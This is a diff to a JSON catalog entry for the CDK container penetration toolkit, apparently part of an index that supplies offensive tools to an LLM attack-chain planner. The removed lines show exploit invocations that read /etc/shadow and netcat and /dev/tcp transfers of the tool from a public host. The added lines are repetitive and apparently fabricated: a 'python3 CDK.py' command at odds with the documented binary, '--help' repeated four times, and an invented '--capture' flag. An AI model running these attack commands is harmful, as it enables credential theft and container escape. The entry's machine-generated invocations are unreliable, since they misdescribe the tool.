@@ -1,16 +1,13 @@
 {
   "category": "frameworks",
   "command_examples": [
-    "./cdk eva --full",
-    "./cdk run cap-dac-read-search",
-    "Running with target: /etc/shadow, ref: /etc/hostname",
-    "nc -lvp 999 < cdk",
-    "cat < /dev/tcp/(your_public_host_ip)/(port) > cdk",
-    "cdk run (--list | <exploit> [<args>...])",
-    "cdk <tool> [<args>...]",
-    "cdk evaluate --full                       Enable file scan during information gathering.",
-    "cdk run --list                            List all available exploits.",
-    "cdk run <exploit> [<args>...]             Run single exploit, docs in $KFIOSA_TARGET_URL"
+    "cd toolboxes/CDK && python3 CDK.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/CDK && python3 CDK.py --help",
+    "cd toolboxes/CDK && python3 CDK.py --help",
+    "cd toolboxes/CDK && python3 CDK.py --help",
+    "cd toolboxes/CDK && python3 CDK.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST CDK --output $KFIOSA_OUTPUT_DIR/CDK.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST CDK --output $KFIOSA_OUTPUT_DIR/CDK.log"
   ],
   "documentation": {
     "readme": "CDK - Zero Dependency Container Penetration Toolkit",
@@ -132,6 +129,11 @@
       {
         "name": "--no-banner",
         "description": "Suppress banner / tool-name output.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--capture",
+        "description": "Capture mode: write packets to a pcap file.",
         "source": "v2_enhancement"
       }
     ],
@@ -304,7 +306,9 @@
     "kfiosa",
     "indexed",
     "polymorphic",
-    "target-adaptive"
+    "target-adaptive",
+    "catalog",
+    "github"
   ],
   "trust": {
     "official_kali": false,
@@ -313,13 +317,12 @@
   },
   "url": "https://github.com/cdk-team/CDK",
   "use_cases": [
-    "When you need frameworks, use CDK because CDK - Zero Dependency Container Penetration Toolkit.",
-    "When you need a concrete invocation, run `./cdk eva --full` as documented upstream for CDK.",
-    "When you need a concrete invocation, run `./cdk run cap-dac-read-search` as documented upstream for CDK.",
-    "When you need a concrete invocation, run `Running with target: /etc/shadow, ref: /etc/hostname` as documented upstream for CDK.",
-    "When you need a concrete invocation, run `nc -lvp 999 < cdk` as documented upstream for CDK.",
-    "When chaining frameworks tools, pair CDK with sibling catalog entries sharing its attack_surface/phase_hint.",
-    "When validating lab setup, run `CDK --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
   ],
   "_kfiosa_enriched_schema": "1.2.0",
   "_kfiosa_enriched_at": "phase4_t16",
